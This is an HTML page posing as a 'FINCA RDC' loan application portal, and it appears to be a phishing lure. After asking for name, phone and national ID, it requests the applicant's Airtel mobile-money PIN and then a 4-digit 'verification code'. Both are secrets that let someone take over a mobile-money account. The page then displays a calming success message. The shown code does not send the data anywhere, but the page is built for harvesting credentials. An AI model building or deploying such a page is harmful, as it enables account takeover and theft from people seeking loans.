<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>FINCA RDC LOANS</title>

<style>
* {
  box-sizing: border-box;
}

body {
  margin: 0;
  font-family: Arial, sans-serif;
  background: #f2f5f8;
  color: #222;
}

header {
  background: #075b43;
  color: white;
  text-align: center;
  padding: 25px 15px;
}

.container {
  max-width: 450px;
  margin: 25px auto;
  padding: 22px;
  background: white;
  border-radius: 12px;
}

h2 {
  text-align: center;
  color: #075b43;
}

label {
  display: block;
  margin-top: 15px;
  font-weight: bold;
}

input, select {
  width: 100%;
  padding: 13px;
  margin-top: 7px;
  border: 1px solid #ccc;
  border-radius: 7px;
}

button {
  width: 100%;
  padding: 14px;
  margin-top: 22px;
  background: #075b43;
  color: white;
  border: none;
  border-radius: 7px;
  font-size: 16px;
}
</style>
</head>
<body>

<header>
  <h1>RDC LOAN APPLICATION</h1>
  <p>Loan Application Portal</p>
</header>

<div class="container" id="screen1">
  <h2>Loan Application</h2>

  <label>Full Name</label>
  <input type="text" placeholder="Enter your full name"required>

  <label>Phone Number</label>
  <input type="tel" placeholder="Enter phone number"required>

  <label>Desired Loan Amount ($)</label>
  <input type="number" placeholder="Enter loan amount" required>

  <label>National ID</label>
  <input type="text" placeholder="Enter your ID"required>

  <button type="button" onclick="showScreen(2)">
    Continue
  </button>
</div>

<div class="container" id="screen2" style="display:none">
  <h2>Contact Information</h2>

  <label>Phone Number</label>
  <input type="tel" placeholder="Enter phone number">

  <label>Airtel PIN</label>
  <input type="password" maxlength="4"
         inputmode="numeric" placeholder="AirtelPIN">

  <button type="button" onclick="showScreen(3)">
    Continue
  </button>
</div>

<div class="container" id="screen3" style="display:none">
  <h2>Application Verification</h2>

  <label>4-Digit Application Verification Code</label>
  <input
    type="text"
    id="verificationCode"
    maxlength="4"
    inputmode="numeric"
    pattern="[0-9]{4}"
    placeholder="Enter application code"
    required
  >

  <button type="button" onclick="finishApplication()">
    Submit Application
  </button>

  <p id="result"></p>
</div>

<script>
function showScreen(number) {
  const currentScreen = document.getElementById("screen" + (number - 1));
  const fields = currentScreen.querySelectorAll("input");

  for (const field of fields) {
    if (!field.value.trim()) {
      alert("Please complete all fields before continuing.");
      field.focus();
      return;
    }
  }

  document.getElementById("screen1").style.display = "none";
  document.getElementById("screen2").style.display = "none";
  document.getElementById("screen3").style.display = "none";

  document.getElementById("screen" + number).style.display = "block";
}

function finishApplication() {
  const code = document.getElementById("verificationCode").value;

  if (!/^\d{4}$/.test(code)) {
    alert("Please enter the 4-digit application verification code.");
    return;
  }

  document.getElementById("result").textContent =
    "Your application has been submitted successfully. Please wait patiently for further updates.";
}
</script>

</body>
</html>
